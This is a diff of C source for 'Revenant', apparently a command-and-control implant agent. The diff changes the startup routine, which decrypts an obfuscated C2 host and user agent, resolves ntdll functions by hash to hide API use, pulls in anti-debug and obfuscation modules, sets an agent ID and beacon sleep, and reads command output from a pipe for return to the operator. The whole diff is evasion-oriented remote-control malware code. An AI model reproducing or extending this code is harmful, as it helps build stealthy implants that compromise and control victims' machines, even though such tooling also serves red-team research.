@@ -1,14 +1,13 @@
 #include "Asm.h"
 #include "Core.h"
 #include "Config.h"
+#include "Poly.h"
 #include "Package.h"
 #include "Command.h"
 #include "Revenant.h"
 #include "AntiDebug.h"
 #include "Utilities.h"
 #include "Obfuscation.h"
-
-
 
 VOID RvntInit() {
 
@@ -18,18 +17,21 @@ VOID RvntInit() {
 
     // Init Connection info
     // UserAgent and Host IP always obfuscated
-    unsigned char s_xk[] = S_XK;
-    char unsigned e_UserAgent[] = CONFIG_USER_AGENT;
-    char unsigned e_Host[] = CONFIG_HOST;
+    UCHAR s_xk[]        = S_XK;
+    UCHAR e_UserAgent[] = CONFIG_USER_AGENT;
+    UCHAR e_Host[]      = CONFIG_HOST;
 
-    xor_dec((char *)e_UserAgent, sizeof(e_UserAgent), (char *)s_xk, sizeof(s_xk));
-    xor_dec((char *)e_Host, sizeof(e_Host), (char *)s_xk, sizeof(s_xk));
+    UCHAR d_UserAgent[sizeof(e_UserAgent)] = {0};
+    UCHAR d_Host[sizeof(e_Host)] = {0};
 
-    wchar_t * w_UserAgent = NULL;
-    wchar_t * w_Host = NULL;
+    ROL_AND_DECRYPT((PUCHAR)e_UserAgent, sizeof(e_UserAgent), 1, d_UserAgent, (PCCH) s_xk);
+    ROL_AND_DECRYPT((PUCHAR)e_Host, sizeof(e_Host), 1, d_Host, (PCCH) s_xk);
 
-    w_UserAgent = str_to_wide(e_UserAgent);
-    w_Host = str_to_wide(e_Host);
+    PWCHAR w_UserAgent = NULL;
+    PWCHAR w_Host = NULL;
+
+    w_UserAgent = str_to_wide( (PCCH) d_UserAgent);
+    w_Host = str_to_wide((PCCH) d_Host);
 
     Instance.Config.Transport.UserAgent = w_UserAgent;
     Instance.Config.Transport.Host      = w_Host;
@@ -38,35 +40,44 @@ VOID RvntInit() {
 
     // Init Win32
 #if CONFIG_ARCH == 64
-    void *ntdll_base = get_ntdll_64();
+    PVOID ntdll_base = get_ntdll_64();
 #else
-    void *ntdll_base = get_ntdll_32();
+    PVOID ntdll_base = get_ntdll_32();
 #endif
     // _tprintf("NTDLL_BASE: %x\n", ntdll_base);
-    Instance.Win32.RtlRandomEx   = get_proc_address_by_hash(ntdll_base, RtlRandomEx_CRC32B);
-    Instance.Win32.RtlGetVersion = get_proc_address_by_hash(ntdll_base, RtlGetVersion_CRC32B);
+    Instance.Win32.RtlRandomEx   = GetProcAddressByHash(ntdll_base, RtlRandomEx_CRC32B);
+    Instance.Win32.RtlGetVersion = GetProcAddressByHash(ntdll_base, RtlGetVersion_CRC32B);
 
     Instance.Session.AgentID = RandomNumber32();
     Instance.Config.Sleeping = CONFIG_SLEEP;
 
     // _tprintf( "AgentID     => %x\n", Instance.Session.AgentID );
     // _tprintf( "Magic Value => %x\n", RVNT_MAGIC_VALUE );
+
+    // TODO: Obfuscate this
+    SYSTEM_INFO si;
+    GetNativeSystemInfo(&si);
+
+    Instance.Session.OSArch = si.wProcessorArchitecture;
+
+    Instance.Session.ProcArch = PROCESS_AGENT_ARCH ;
 }
 
-void AnonPipeRead( HANDLE hSTD_OUT_Read ) {
+VOID AnonPipeRead( HANDLE hSTD_OUT_Read ) {
     PPACKAGE Package         = NULL;
     LPVOID   pOutputBuffer   = NULL;
     UCHAR    buf[ 1025 ]     = { 0 };
     DWORD    dwBufferSize    = 0;
     DWORD    dwRead          = 0;
-    BOOL     SuccessFul      = FALSE;
+    BOOLEAN  SuccessFul      = FALSE;
 
     pOutputBuffer = LocalAlloc( LPTR, sizeof(LPVOID) );
 
     do {
         SuccessFul = ReadFile( hSTD_OUT_Read, buf, 1024, &dwRead, NULL );
-        if ( dwRead == 0)
+        if ( dwRead == 0) {
             break;
+        }
 
         pOutputBuffer = LocalReAlloc(
                 pOutputBuffer,
